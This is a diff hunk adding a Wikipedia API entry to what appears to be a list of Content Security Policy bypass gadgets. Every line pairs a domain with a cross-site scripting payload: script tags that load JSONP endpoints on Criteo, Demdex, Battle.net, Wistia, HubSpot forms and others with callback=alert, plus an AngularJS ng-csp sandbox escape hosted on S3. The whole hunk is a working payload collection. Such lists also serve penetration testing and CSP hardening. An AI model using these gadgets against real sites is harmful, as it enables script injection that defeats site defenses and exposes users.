@@ -84,6 +84,7 @@ don.bild.de	<script src="https://don.bild.de/glg/userDetails?callback=alert"></s
 dpm.demdex.net	<script src="https://dpm.demdex.net/id?d_cb=alert"></script>
 dynamic.criteo.com	<script src="https://dynamic.criteo.com/js/ld/s2s.js?p=1&c=1&j=alert"></script>
 elysiumwebsite.s3.amazonaws.com	<body ng-app ng-csp><script src="//elysiumwebsite.s3.amazonaws.com/uploads/blog-media/rockstar/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+en.wikipedia.org  <script src="https://en.wikipedia.org/w/api.php?action=parse&format=json&page=x&callback=alert"></script>
 eu.battle.net	<script src="https://eu.battle.net/support/update/json?callback=alert"></script>
 fast.wistia.com	<script src="https://fast.wistia.com/embed/medias/o75jtw7654.json?callback=alert"></script>
 forms.hsforms.com	<script src="https://forms.hsforms.com/embed/v3/form/1/00000000-0000-0000-0000-000000000000?callback=alert"></script>
